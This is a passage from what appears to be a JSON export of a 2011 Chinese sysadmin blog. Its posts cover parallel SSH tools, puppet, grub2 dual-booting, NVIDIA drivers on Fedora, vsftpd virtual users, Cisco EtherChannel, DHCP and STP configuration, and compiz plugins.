0.02, 0.00\n192.168.9.102: [1] 14:04:58 [SUCCESS] 192.168.9.102 9922\n192.168.8.171:  14:04:59 up 35 days,  2:01,  6 users,  load average: 0.00, 0.00, 0.00\n192.168.8.171: [2] 14:04:59 [SUCCESS] 192.168.8.171 22\n192.168.9.104:  14:04:59 up 7 days, 20:59,  0 users,  load average: 0.10, 0.04, 0.01\n192.168.9.104: [3] 14:04:59 [SUCCESS] 192.168.9.104 9922\n[root@server pssh-2.2.2]# cat test.txt\n192.168.9.102:9922\n192.168.9.104:9922\n192.168.8.171:22   //注意我的端口号不仅是默认的22\n假如想将输出重定向到一个文件 加-o file 选项</pre>\n<strong>2 pscp  把文件并行地复制到多个主机上</strong>\n注意 是从服务器端给客户端传送文件:\n<pre class=\"sh_bash\">[root@server pssh-2.2.2]# pscp -h test.txt /etc/sysconfig/network /tmp/network   //标示将本地的/etc/sysconfig/network传到目标服务器的/tmp/network</pre>\n<strong>3 prsync 使用rsync协议从本地计算机同步到远程主机</strong>\n<pre class=\"sh_bash\">[root@server ~]# pssh -h test.txt -P mkdir /tmp/etc\n[root@server ~]# prsync -h test.txt -l dongwm -a -r /etc/sysconfig /tmp/etc //标示将本地的/etc/sysconfig目录递归同步到目标服务器的 /tmp/etc目录下,并保持原来的时间戳,使用用户 dongwm</pre>\n<strong>4  pslurp 将文件从远程主机复制到本地,和pscp方向相反:</strong>\n<pre class=\"sh_bash\">[root@server ~]# pslurp -h test.txt   -L /tmp/test -l root /tmp/network test  //标示将目标服务器的/tmp/network文件复制到本地的/tmp/test目录下,并更名为test\n[1] 14:53:54 [SUCCESS] 192.168.9.102 9922\n[2] 14:53:54 [SUCCESS] 192.168.9.104 9922\n[root@server ~]# ll /tmp/test/192.168.9.10\n192.168.9.102/ 192.168.9.104/\n[root@server ~]# ll /tmp/test/192.168.9.102/\n总计 4.0K\n-rw-r--r-- 1 root root 60 2011-04-22 14:53 test\n[root@server ~]# ll /tmp/test/192.168.9.104/\n总计 4.0K\n-rw-r--r-- 1 root root 60 2011-04-22 14:53 test</pre>\n<strong>5  pnuke 并行在远程主机杀进程:</strong>\n<pre class=\"sh_bash\">[root@server ~]# pnuke -h test.txt   syslog //杀死目标服务器的syslog进程,只要ps进程中出现相关词语 都能杀死\n[1] 15:05:14 [SUCCESS] 192.168.9.102 9922\n[2] 15:05:14 [SUCCESS] 192.168.9.104 9922</pre>\n<div id=\"livemargins_control\" style=\"position: absolute; display: none; z-index: 9999;\"><img style=\"position: absolute; left: -77px; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-horizontal.png\" alt=\"\" width=\"77\" height=\"5\" /> <img style=\"position: absolute; left: 0; top: -5px;\" src=\"chrome://livemargins/skin/monitor-background-vertical.png\" alt=\"\" /> <img id=\"monitor-play-button\" style=\"position: absolute; left: 1px; top: 0; opacity: 0.5; cursor: pointer;\" onmouseover=\"this.style.opacity=1\" onmouseout=\"this.style.opacity=0.5\" src=\"chrome://livemargins/skin/monitor-play-button.png\" alt=\"\" /></div>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=eb2641aa-47eb-83ae-b8a8-d1a0b97e174d\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "22"
    }
  },
  {
    "id": 61,
    "title": "准确掌握puppet client向server请求时间",
    "category": "puppet",
    "tags": [

    ],
    "url": "/archives/%E5%87%86%E7%A1%AE%E6%8E%8C%E6%8F%A1puppet-client%E5%90%91server%E8%AF%B7%E6%B1%82%E6%97%B6%E9%97%B4/",
    "content": "<p><p>使用puppet，发现默认半小时客户端就和服务器端请求一次信息，如果发现有更新就会自动更新。但是在使用了tagmail后，这是一件很郁闷的事情，因为请求一次就产生一个邮件，设想有上千台client，没30分钟一个邮件。。。但是我不希望用cron，因为有些事情是很紧急的，不能等到下一个定时任务执行时才去执行。</p>  <p>解决方法：</p>  <p>修改puppet.conf修改向server请求的时间间隔：</p>  <p>在[agent]下面加一行：</p>  <p>runinterval = 86400&#160; //单位是秒 我设置的一天更新一次&#160; 然后puppetd进程是一直后台运行的</p>  <p>采用server端向客户端主动发送要求，触发客户端来向server请求</p>  <p>#puppetrun –host 主机名</p>  <p>可以吧主机做个for循环，虽然性能不够，也不能实现并行执行。幸好puppetrun只是发送一个信号</p></p>\n",
    "date": {
      "year": "2011",
      "month": "April",
      "day": "28"
    }
  },
  {
    "id": 62,
    "title": "fedora ubuntu 添加对方grub菜单",
    "category": "fedora",
    "tags": [
      "grub2",
      "ubuntu"
    ],
    "url": "/archives/fedora-ubuntu-%E6%B7%BB%E5%8A%A0%E5%AF%B9%E6%96%B9grub%E8%8F%9C%E5%8D%95/",
    "content": "<p><strong>这几天折腾ubuntu11.04，结果把我的opensuse弄坏了...索性直接换成了fedora。乘机研究了下grub2，以及各个操作系统之间的启动菜单的一些特性。\n1 先fedora，后ubuntu\n进入ubuntu系统：\n<pre class=\"sh_bash\">sudo grub-install /dev/sda //安装grub到硬盘mbr，一般系统会自动搜索到\nsudo update-grub2  //更新grub.cfg</pre>\n进入ubuntuliveCD：\n<pre class=\"sh_bash\">sudo su\nmount /dev/sdaX /mnt //挂载系统文件 我这里是根分区\nmount /dev/sdaY /tmp/boot  //挂载boot分区\ncp -rp /tmp/boot/* /mnt/boot //我直接挂载/mnt/boot有问题，所以用这种简介方式，把/boot文件考到/mnt/boot下\ngrub-install --root-directory=/mnt /dev/sda --force   //强制安装grub到硬盘mbr root目录是指定的/mnt\nupdate-grub2  //更新grub.cfg\n注：mbr信息可以执行如下脚本取得：\nhttp://nchc.dl.sourceforge.net/project/bootinfoscript/bootinfoscript/0.55/boot_info_script055.sh</strong></p>\n\n<p><strong></pre>\n</strong></p>\n\n<p><strong>2 先</strong><strong>ubuntu</strong><strong>，后</strong><strong>fedora</strong></p>\n\n<p><pre class=\"sh_bash\">sudo gedit /boot/grub/menu.lst\ntitle Ubuntu\nroot (hd0,9)  //根目录所在分区，根据上面的脚本自己调整\nkernel /vmlinuz-2.6.38-8-generic root=UUID=7319d96d-4c6e-4e00-84b4-f5ed70052456 ro   quiet splash vt.handoff=7\n可以直接把ubuntu分区上的grub.cfg上的相同字段 linux 行的内容复制\ninitrd /initrd.img-2.6.38-8-generic //复制ubuntu分区上的grub.cfg上的相同字段 /initrd 内容</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "May",
      "day": "01"
    }
  },
  {
    "id": 63,
    "title": "fedora 3D效果实现",
    "category": "fedora",
    "tags": [
      "compiz",
      "dkms",
      "dracut",
      "nouveau",
      "nvidia"
    ],
    "url": "/archives/fedora-3d%E6%95%88%E6%9E%9C%E5%AE%9E%E7%8E%B0/",
    "content": "<p>很多会觉得这个有什么可写的。。的确，在ubuntu，opensuse下都是很简单就可以实现的。尤其是suse的ymp一键安装^.^，但是fedora有点问题，因为第一他默认已经安装了一个驱动nouveau，需要先把它禁掉，然后安装你的电脑配置的显卡驱动，这个需要自己去找，然后去官网下载再安装：\n过程如下：\n1 查找下载电脑的显卡品牌型号：\n<pre class=\"sh_bash\">[root@dongwm dongwm]# lspci | grep VGA\n00:0d.0 VGA compatible controller: nVidia Corporation C61 [GeForce 6150SE nForce 430] (rev a2)\n这是nvidia驱动，在官网选择以下信息搜索：\n产品类型-GeForce --产品系列-GeForce 6 Series -- 产品家族 GeForce 6150SE nForce 430 --操作系统 Linux32-bit --语言 Chinese\n然后下载。</pre>\n2 禁用nouveau驱动 （网上的方法都是抄人家的，结果还没抄完。。）\n<pre class=\"sh_bash\">1 编辑grub配置\nvi /boot/grub/grub.conf\n在操作系统的kernel 哪行 末尾 加一句:rdblacklist=nouveau\n类似这样 ：\nkernel /boot/vmlinuz-2.6.35.6-45.fc14.i686 ro root=UUID=7e01d298-0882-4484-b9e9-4da41ccb5308 rd_NO_LUKS rd_NO_LVM rd_NO_MD rd_NO_DM LANG=zh_CN.UTF-8 KEYTABLE=us rhgb quiet rdblacklist=nouveau\n2 设置模块加载黑名单：\nvi /etc/modprobe.d/blacklist.conf\n1 注释   blacklist nvidiafb\n#  blacklist nvidiafb\n2 最后添加一行：\nblacklist nouveau\n3 <span style=\"color: #ff0000;\">这里是关键</span>，dracut 在fedora12以后就取代 initrd 成为新的引导系统：\n# mv /boot/initramfs-$(uname -r).img /boot/initramfs-$(uname -r)-nouveau.img\n# dracut /boot/initramfs-$(uname -r).img $(uname -r)  //重新生成引导系统</pre></p>\n\n<p>3 修改为开机自动文本启动，因为不能打开X窗口，这里也可以编辑开机启动文件选项，因为我需要重启2次  就直接了：\n<pre class=\"sh_bash\"> cat /etc/inittab\nid:3:initdefault:   //5是启动Xwindows 3是文本启动</pre>\n4  下载内核头文件和dkms，因为yum环境下kernel-devel永远是最新的版本，这样安装的就和内核版本不一样，安装驱动时候是找不到头文件的，所以需要指定一下具体的版本：\n<pre class=\"sh_bash\">[root@dongwm dongwm]# rpm -qa |grep kernel\nkernel-headers-2.6.35.12-90.fc14.i686\nkernel-2.6.35.6-45.fc14.i686\n然后下载同一个版本的：\nyum install kernel-devel-2.6.35.6-45.fc14.i686  dkms -y</pre>\n5  重启后检查是不是有nouveau\n<pre class=\"sh_bash\">lsmod|grep nouveau</p>\n\n<p></pre>6 没有就可以安装驱动了：\n<pre class=\"sh_bash\">sh /home/dongwm/NVIDIA-Linux-x86-270.41.06.run\n安装后重启</pre>\n7 下载3D需要的compiz等工具：\n<pre class=\"sh_bash\">yum install compiz compiz-fusion* fusion* emerald emerald-themes avant-window-navigator</pre></p>\n\n<p>在系统工具中有那个熟悉的蓝色图标喽</p>\n",
    "date": {
      "year": "2011",
      "month": "May",
      "day": "08"
    }
  },
  {
    "id": 64,
    "title": "使用vsftpd虚拟用户搭建FTP服务器",
    "category": "linux基础",
    "tags": [
      "vsftpd",
      "虚拟用户"
    ],
    "url": "/archives/%E4%BD%BF%E7%94%A8vsftpd%E8%99%9A%E6%8B%9F%E7%94%A8%E6%88%B7%E6%90%AD%E5%BB%BAftp%E6%9C%8D%E5%8A%A1%E5%99%A8/",
    "content": "<p><strong>需求：</strong>\n<strong> 用户：dongwm，ftpuser1,ftpuser2</strong>\n<strong> 用户dongwm可以有本用户和其他2个用户的文件相关权限，ftpuser1和ftpuser2只有对本用户的相关权限，不能查看其他用户信息</strong></p>\n\n<p><strong>思路：用户dongwm使用本地用户，但是不能登录服务器，ftpuser使用虚拟用户，并chroot。</strong></p>\n\n<p><strong>前期准备：</strong></p>\n\n<p><strong>1 安装vsftp</strong>\nyum install vsftpd -y\n<strong>2  安装db4 //虚拟用户数据库相关</strong>\nyum install db4-utils db4 db4-devel db4 -y\n<strong>3  创建相关用户信息文本文件：</strong>\nroot@client ~&gt;  cat /etc/vsftpd/virtualuser.txt\nftpuser1  //用户1\ne5bm0Nw}Bj  //用户1密码\nftpuser2\ne5bm0sf4ss\n<strong>4 生成数据库文件：</strong>\ndb_load -T -t hash -f /etc/vsftpd/virtualuser.txt /etc/vsftpd/virtualuser.db\nchmod 600 /etc/vsftpd/vsftpd_virtualuser.db\n<strong>5 删除用户信息文本文件</strong>\nrm -rf  /etc/vsftpd/virtualuser.txt  //很重要的一步 要不然多恐怖阿？\n<strong>6 修改pam.d验证：</strong>\nroot@client ~&gt;  vi /etc/pam.d/vsftpd\n将里面的所有行都注释掉，添加以下2行：\nauth required /lib64/security/pam_userdb.so db=/etc/vsftpd/vsftpd_virtualuser\naccount required /lib64/security/pam_userdb.so db=/etc/vsftpd/vsftpd_virtualuser\n注：里面使用lib64是因为我的是64位系统  指定的db文件后面没有后缀.db\n<strong>7 创建用户：</strong>\nuseradd -s /sbin/nologin -d /var/ftp/dongwm -G ftp dongwm //设置shell不能登录，家目录为/var/ftp/dongwm\nchown 755 /var/ftp/dongwm -R</p>\n\n<p><strong>配置vsftpd：</strong>\n<strong>cd /etc/vsftpd</strong>\n<strong>1 vsftpd.conf  //本地用户使用了这个配置文件的配置</strong>\nanonymous_enable=NO  //因为我们使用了虚拟用户登录 这个选项不需要\nlocal_enable=YES  //容许本地登录\nwrite_enable=YES\nlocal_umask=022\nanon_upload_enable=YES\nanon_mkdir_write_enable=YES\ndirmessage_enable=YES\nxferlog_enable=YES\nconnect_from_port_20=YES\nxferlog_std_format=YES\nchroot_list_enable=YES  //使用chroot\nchroot_list_file=/etc/vsftpd/chroot_list //这个文件里面列出来的用户是chroot环境\nlisten=YES\npam_service_name=vsftpd  //虚拟用户需要有这个配置\nuserlist_enable=YES\ntcp_wrappers=YES\nuserlist_deny=NO  //只容许userlist这个文件里面的用户访问ftp\nuser_config_dir=/etc/vsftpd/vuserconfig  //虚拟用户的配置文件的主目录\nguest_enable=YES //虚拟用户使用本地用户\nguest_username=dongwm  //指定本地用户dongwm\nvirtual_use_local_privs=YES\nchmod_enable=YES\nanon_other_write_enable=YES\ndownload_enable=YES\nanon_world_readable_only=NO</p>\n\n<p><strong>2 cat chroot_list</strong>\nftpuser1\nftpuser2  //这2个用户只能在它的家目录下相关权限\n<strong>3 root@client /etc/vsftpd&gt; cat user_list </strong>\nftpuser1\nftpuser2\ndongwm  //只有这三个用户能登录ftp</p>\n\n<p><strong>4 ftpuser1的配置文件，注意文件地址：</strong>\nroot@client /etc/vsftpd&gt; cat vuserconfig/ftpuser1\nlocal_root=/var/ftp/dongwm/ftpuser1 //指定这个用户的家目录地址，在dongwm的家目录的子目录下\nwrite_enable=YES\ndownload_enable=YES\nanon_world_readable_only=NO\nanon_upload_enable=YES\nanon_mkdir_write_enable=YES\nanon_other_write_enable=YES\nlocal_umask=022\nftpuser2的配置文件类似于ftpuser1,只是家目录不同：\nroot@client /etc/vsftpd&gt; cat vuserconfig/ftpuser2\nlocal_root=/var/ftp/dongwm/ftpuser2\nwrite_enable=YES\ndownload_enable=YES\nanon_world_readable_only=NO\nanon_upload_enable=YES\nanon_mkdir_write_enable=YES\nanon_other_write_enable=YES\nlocal_umask=022</p>\n\n<p><strong>5 启动服务</strong>\nroot@client /etc/vsftpd&gt; /etc/init.d/vsftpd start\nroot@client /etc/vsftpd&gt; chkconfig vsftpd on</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "May",
      "day": "10"
    }
  },
  {
    "id": 65,
    "title": "配置auto  pagp的以太信道",
    "category": "思科",
    "tags": [
      "pagp",
      "以太信道"
    ],
    "url": "/archives/peizhiautopagpdeyitaixindao/",
    "content": "<p>SW1(config)#int range f0/13 -15\nCreating a port-channel interface Port-channel1\nSW1(config-if-range)#\n*Mar  1 00:01:59.131: %EC-5-BUNDLE: Interface Fa0/13 joined port-channel Po1\n*Mar  1 00:01:59.375: %EC-5-BUNDLE: Interface Fa0/14 joined port-channel Po1\n*Mar  1 00:01:59.479: %EC-5-BUNDLE: Interface Fa0/15 joined port-channel Po1\nSW1(config-if-range)#\n*Mar  1 00:02:01.971: %LINEPROTO-5-UPDOWN: Line protocol on Interface Port-channel1, changed state to up\nSW1(config-if-range)#int port-channel1\nSW1(config-if)#switchport mode</p>\n\n<p>SW2(config)#int range f0/13 -15\nCreating a port-channel interface Port-channel1\nSW2(config-if-range)#int port-channel1\nSW2(config-if)#switchport mode  SW1(config)#int range f0/13 -15\nSW2(config-if-range)#channel-group 1 mode auto\nCreating a port-channel interface Port-channel1\nSW2(config-if-range)#\nSW2(config-if-range)#int port-channel1\nSW2(config-if)#switchport mode  dynamic desirable</p>\n\n<p>注：desirable和auto是PAGP协议主动协商和被动协商专用词\nSW1#show etherchannel summary\nFlags: D - down P - in port-channel\nI - stand-alone s - suspended\nH - Hot-standby (LACP only)\nR - Layer3 S - Layer2\nu - unsuitable for bundling\nU - in use f - failed to allocate aggregator\nd - default port\nNumber of channel-groups in use: 1\nNumber of aggregators: 1\nGroup Port-channel Protocol Ports\n------+-------------+-----------+--------------------------------------\n1 Po1(SU) PAgP Fa0/13(P) Fa0/14(P) Fa0/15(P)\nSW1#show interface port-channel1 switchport\nName: Po1\nSwitchport: Enabled\nAdministrative Mode: dynamic desirable\nOperational Mode: trunk\nAdministrative Trunking Encapsulation: negotiate\nOperational Trunking Encapsulation: isl\nNegotiation of Trunking: On\nAccess Mode VLAN: 1 (default)\nTrunking Native Mode VLAN: 1 (default)\nSW1#show interface trunk\nPort Mode Encapsulation Status Native vlan\nPo1 desirable n-isl trunking 1\nPort Vlans allowed on trunk\nPo1 1-4094\nPort Vlans allowed and active in management domain\nPo1 1\nPort Vlans in spanning tree forwarding state and not pruned\nPo1 1\nSW1#show spanning-tree vlan 1\nVLAN0001\nSpanning tree enabled protocol ieee\nRoot ID Priority 32769\nAddress 000a.f411.0e00\nThis bridge is the root\nHello Time 2 sec Max Age 20 sec Forward Delay 15 sec\nBridge ID Priority 32769 (priority 32768 sys-id-ext 1)\nAddress 000a.f411.0e00\nHello Time 2 sec Max Age 20 sec Forward Delay 15 sec\nAging Time 15\nInterface Role Sts Cost Prio.Nbr Type\n---------------- ---- --- --------- -------- --------------------------\nPo1 Desg FWD 9 128.65 P2p</p>\n",
    "date": {
      "year": "2011",
      "month": "May",
      "day": "11"
    }
  },
  {
    "id": 66,
    "title": "compiz 外挂插件欣赏和安装",
    "category": "debian",
    "tags": [
      "autumn",
      "bubbles",
      "Dodge",
      "freewins",
      "photowheel",
      "screensaver",
      "snow",
      "STARS",
      "TRIP",
      "Wizard"
    ],
    "url": "/archives/compiz-%E5%A4%96%E6%8C%82%E6%8F%92%E4%BB%B6%E6%AC%A3%E8%B5%8F%E5%92%8C%E5%AE%89%E8%A3%85/",
    "content": "<p><strong>其实很早就想写一篇关于compiz一个不为人知的插件的安装使用文章。很多人以为compiz就是那一些，其实在http://gitweb.compiz.org/上面有很多插件。不过有一些年代久远没人维护。网上可能有一些介绍这些插件的文章，只是停留在截图和简单地说明，包括ubuntu社区也没有相关的解释。作为一个菜鸟 呵呵 我来写一下：</strong>\n<strong>视频地址：http://v.youku.com/v_show/id_XMjcwNDUyODQ0.html\n视频顺序：wizard，trip，freewins，autumn，stars，snow，fireslies，bubbles，screensaver，dodge（非</strong>\n<strong> “动画”里面的选项），ghost，贯穿始终的包括peek和mousetrails。因为我的电脑比较卡，显卡性能不行，没有展示立体效果的</strong>\n<strong> photowheel和snowglobe以及extra-animations，anaglyph（需要3D眼镜）</strong>\n<strong>1 前提知识准备：</strong>\ncmake：和make类似，全名\"cross platform make”。好像compiz在0.9.0以后编译系统都从automake换成cmake。\nboost库：因为compiz再0.9.0以后重写了C 使用C++ 需要这个C++库\ngit：版本控制工具，linux之父所作！一般更新包文件都使用这个工具，我们要下载的compiz插件都是git版本控制</p>\n\n<p><strong>2 前期准备：</strong>\ndongwm@dongwm:~$sudo apt-get install git-core cmake libcairo2-dev librsvg2-dev libglib2.0-dev libpng12-dev libdbus-1-dev libboost-dev libxml2-dev libgl1-mesa-dev libglu1-mesa-dev libwnck-dev libgconf2-dev libx11-xcb-dev libxslt1-dev libnotify-dev libmetacity-dev libgnome-window-settings-dev libgnome-desktop-dev gnome-control-center-dev intltool cython  git\n注 等以后安装过程中要是提示boost不存在或者怎么样 那就是libboost的库没有装全，我没有挨个研究，就把新立得关于boost相关的勾选了\n<strong>3 安装思路</strong></p>\n\n<p>所有的插件地址都在http://gitweb.compiz.org/ 点开每个链接 里面会有类似的地址：git://URL（一个地址）\n然后我们在本地执行：\ndongwm@dongwm:~$git clone git://URL\n一下过程也可以实现：\ndongwm@dongwm:~$cd 下载的插件的英文名称\ndongwm@dongwm:~$mkdir build &amp;&amp; cd build &amp;&amp; cmake .. &amp;&amp; make &amp;&amp; make install\n其中的autumn，snow，气泡等插件都是compiz/plugins-unsupported里面集成了！但是默认不在compiz目录下需要执行以下命令（注意  修改为你实际的家目录，我的用户是dongwm 所以家目录是/home/dongwm，而.compiz-1目录不知道是不是也是同名，反正是“.”开头的compiz目录，如果下面的目录有plugins，metadata等说明就是这个目录）：</p>\n\n<p>cp /usr/local/lib/compiz/lib* /home/dongwm/.compiz-1/plugins/\ncp /usr/local/share/compiz/* /home/dongwm/.compiz-1/metadata/ -rp</p>\n\n<p>问题解决：</p>\n\n<p>/usr/bin/ld: cannot find -lGL\n/usr/bin/ld: cannot find -lGL\ncollect2: ld returned 1 exit status\nmake[2]: *** [libfreewins.so] 错误 1\nmake[1]: *** [CMakeFiles/freewins.dir/all] 错误 2</p>\n\n<p>cd  /usr/lib/\nsudo mv libGL.so libGL.so.bak\nsudo ln -s libGL.so.1 libGL.so</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "May",
      "day": "27"
    }
  },
  {
    "id": 67,
    "title": "ubuntu11.04安装Macbuntu",
    "category": "ubuntu",
    "tags": [
      "macbuntu"
    ],
    "url": "/archives/ubuntu11-04%E5%AE%89%E8%A3%85macbuntu/",
    "content": "<p><strong>Macbuntu是什么呢？从名字就可以看出来和苹果的Mac OS有关，是滴，他就是让ubuntu变成Mac，并且保留了ubuntu所有的3D特效：</strong>\n<img style=\"max-width: 800px;\" src=\"http://farm3.static.flickr.com/2699/5779619664_10bb87a0c5_b.jpg\" alt=\"\" />它的官方下载地址是：https://sourceforge.net/projects/macbuntu/ 但是目前还没出11.04版本 只能使用10.10版本，需要修改install.sh文件，否则因为版本问题会报错：\n将这一段：</p>\n\n<p>chk_system()\n{\necho \"\"\necho \"Checking Ubuntu version...\"\n#       s=`cat /etc/issue | grep -i \"$UBUNTU\"`\n#       if [ ! -n \"$s\" ]; then\n#               echo \"Failed. System not supported, script will end here\"\n#               echo \"To ignore their compatibility with current OS try ./install.sh force\"\n#               echo \"Exiting...\"\n#               exit 1;\n#       fi\necho \"Passed\"\n}\n去掉其中的判断修改为：\nchk_system()\n{\necho \"\"\necho \"Checking Ubuntu version...\"\necho \"Passed\"\n}\n然后按照提示安装\n<img style=\"max-width: 800px;\" src=\"http://www.flickr.com/photos/63483712@N05/5779619664/\" alt=\"\" /></p>\n",
    "date": {
      "year": "2011",
      "month": "May",
      "day": "31"
    }
  },
  {
    "id": 68,
    "title": "路由器DHCP配置",
    "category": "思科",
    "tags": [
      "dhcp"
    ],
    "url": "/archives/luyouqidhcppeizhi/",
    "content": "<p>实验要求:\nR1模拟成PC，R2模拟成DHCP服务器。\nR1的E0/0不配置地址，R2的E0/0可配成192.168.1.1/24。\n完成DHCP的相关配置。\n查看R1的e0/0是否成功获得地址。</p>\n\n<p>实验步骤\nR1\nR1(config)#no ip routing\nR1(config)#int e0/0\nR1(config-if)#no shutdown\nR1(config-if)#ip address dhcp</p>\n\n<p>R2\nR2 (config)#int e0/0\nR2 (config-if)#no shutdown\nR2 (config-if)#ip address 192.168.1.1  255.255.255.0\nR2 (config-if)#exit\nR2 (config)#ip dhcp pool dongwm\nR2 (dhcp-config)#network 192.168.1.96  255.255.255.224\nR2 (dhcp-config)#default-router 192.168.1.1\nR2 (dhcp-config)#dns-server 202.106.196.115  202.106.0.20\nR2 (dhcp-config)#domain-name dongwm.com\nR2 (dhcp-config)#lease 1\nR2 (dhcp-config)#exit\nR2 (config)#ip dhcp excluded-address 192.168.1.97  192.168.1.99\nR2 (config)#end\nR2#</p>\n\n<p>测试命令</p>\n\n<p>R1\nR1#sh interface e0/0\nR1#sh run</p>\n\n<p>R2\nR2#sh ip dhcp binding\nR2#sh run</p>\n",
    "date": {
      "year": "2011",
      "month": "June",
      "day": "10"
    }
  },
  {
    "id": 69,
    "title": "linux 在线听歌软件",
    "category": "linux基础",
    "tags": [

    ],
    "url": "/archives/linux-%E5%9C%A8%E7%BA%BF%E5%90%AC%E6%AD%8C%E8%BD%AF%E4%BB%B6/",
    "content": "<p>一直遗憾的是linux没有什么好的音乐软件，比如实现一些重复播放，保存列表的方式也比较落后，后来发现了这款亦歌AIR版本(并且显示歌词额)：\n<img style=\"max-width: 800px;\" src=\"http://www.flickr.com/photos/56416171@N03/5832311362/\" alt=\"\" />\n<img style=\"max-width: 800px;\" src=\"http://farm4.static.flickr.com/3358/5832311362_124f342c81_b.jpg\" alt=\"\" /></p>\n\n<p><a href=\"http://get.adobe.com/air/\" target=\"_blank\">这里可以获得Adobe AIR</a>\n<a href=\"http://www.1g1g.org/dl.php?id=1g1gair&amp;source=1g1g.air\" target=\"_blank\">这里直接下载亦歌.air文件</a></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 70,
    "title": "zxtm实现mongodb的Route Server负载均衡",
    "category": "zxtm",
    "tags": [

    ],
    "url": "/archives/zxtm%E5%AE%9E%E7%8E%B0mongodb%E7%9A%84route-server%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/",
    "content": "<p>Route Server是一个mongos 实例，客户端由此接入，可以让整个集群看上去像单一数据库，简单的理解就是一个前端的路由。在实际配置中Route Server的冗余那也是很必须的，伟大的ZXTM也支持了它！关键步骤是1&nbsp; 创建pool时每个node都填入其ip和route sever的端口2&nbsp; 在创建virtual server时选择协议“Generic&nbsp; client first”这样就可以通过负载均衡来访问：[root@test ~]# mongo 192.168.8.20:30000MongoDB shell version: 1.8.1connecting to: 192.168.8.200:30000/test&gt; </p>\n",
    "date": {
      "year": "2011",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 71,
    "title": "STP特性总结（一）",
    "category": "stp",
    "tags": [
      "Tuning Timers，PortFast，UplinkFast，BackboneFast ，BPDU Guard"
    ],
    "url": "/archives/centos%E4%B8%8Bvsftpd%E4%BD%BF%E7%94%A8%E8%99%9A%E6%8B%9F%E7%94%A8%E6%88%B7%E6%9E%B6%E8%AE%BEftp%E6%9C%8D%E5%8A%A1%E5%99%A8/",
    "content": "<p><p><strong>1 Tuning Timers 以尽量减少延误而端口在听/学习状态的时间</strong></p>  <p>spanning-tree vlan 1 root primary   spanning-tree vlan 1 forward-time 4</p>  <p>SW1#show spanning-tree vlan 1   VLAN0001    Spanning tree enabled protocol ieee    Root ID Priority 24577    Address 0016.4639.d580    This bridge is the root    Hello Time 2 sec Max Age 20 sec Forward Delay 4 sec    Bridge ID Priority 24577 (priority 24576 sys-id-ext 1)    Address 0016.4639.d580    Hello Time 2 sec Max Age 20 sec Forward Delay 4 sec    Aging Time 15</p>  <p>SW2#debug spanning-tree events   Spanning Tree event debugging is on    SW2#conf t    Enter configuration commands, one per line. End with CNTL/Z.    SW2(config)#int fa 0/3    SW2(config-if)#shut    01:00:02: STP: VLAN0001 sent Topology Change Notice on Fa0/13    01:00:04: %LINK-5-CHANGED: Interface FastEthernet0/3, changed state to    administratively down    01:00:05: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/3,    changed state to down    SW2(config-if)#no shut    01:00:10: %LINK-3-UPDOWN: Interface FastEthernet0/3, changed state to down    01:00:10: set portid: VLAN0001 Fa0/3: new port id 8005    01:00:10: STP: VLAN0001 Fa0/3 -&gt; listening    01:00:12: %LINK-3-UPDOWN: Interface FastEthernet0/3, changed state to up    01:00:13: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/3,    changed state to up    01:00:14: STP: VLAN0001 Fa0/3 -&gt; learning    01:00:18: STP: VLAN0001 sent Topology Change Notice on Fa0/13    01:00:18: STP: VLAN0001 Fa0/3 –&gt; forwarding&#160; //注意从监听-学习-转发状态都是用了4秒</p><!--more--><p>&#160;</p>  <p><strong>2 PortFast 允许access-ports 绕过STP学习/监听状态的过程直接变成转发</strong></p>  <p>interface range Fa 0/1 – 6   spanning-tree portfast</p>  <p>SW1#show spanning-tree interface fa0/1 detail   Port 3 (FastEthernet0/1) of VLAN0001 is forwarding    Port path cost 19, Port priority 128, Port Identifier 128.3.    Designated root has priority 32769, address 000e.83b2.9480    Designated bridge has priority 32769, address 0016.4639.d580    Designated port id is 128.3, designated path cost 19    Timers: message age 0, forward delay 0, hold 0    Number of transitions to forwarding state: 1    The port is in the portfast mode&#160; //PortFast端口依然向外转发BPDU    Link type is point-to-point by default    BPDU: sent 2517, received 0        SW1#show spanning-tree interface fa0/1 detail    Port 3 (FastEthernet0/1) of VLAN0001 is forwarding    Port path cost 19, Port priority 128, Port Identifier 128.3.    Designated root has priority 32769, address 000e.83b2.9480    Designated bridge has priority 32769, address 0016.4639.d580    Designated port id is 128.3, designated path cost 19    Timers: message age 0, forward delay 0, hold 0    Number of transitions to forwarding state: 1    The port is in the portfast mode    Link type is point-to-point by default    BPDU: sent 2553, received 0</p>  <p>   SW1#debug spanning-tree events    Spanning Tree event debugging is on    SW1#conf t    Enter configuration commands, one per line. End with CNTL/Z.    SW1(config)#interface fa0/1    SW1(config-if)#shutdown    01:44:09: %LINK-5-CHANGED: Interface FastEthernet0/1, changed state to    administratively down    01:44:10: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1,    changed state to down    SW1(config-if)#no shutdown    SW1(config-if)#    01:44:22: set portid: VLAN0001 Fa0/1: new port id 8003    01:44:22: STP: VLAN0001 Fa0/1 -&gt;jump to forwarding from blocking    01:44:22: %LINK-3-UPDOWN: Interface FastEthernet0/1, changed state to up    01:44:23: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1,    changed state to up    SW1(config-if)#shut    SW1(config-if)#    01:45:10: %LINK-5-CHANGED: Interface FastEthernet0/1, changed state to    administratively down    01:45:11: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1,    changed state to down    SW1(config-if)#no spanning-tree portf    SW1(config-if)#no shutdown    01:45:27: set portid: VLAN0001 Fa0/1: new port id 8003    01:45:27: STP: VLAN0001 Fa0/1 -&gt; listening    01:45:27: %LINK-3-UPDOWN: Interface FastEthernet0/1, changed state to up    01:45:28: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1,    changed state to up    01:45:42: 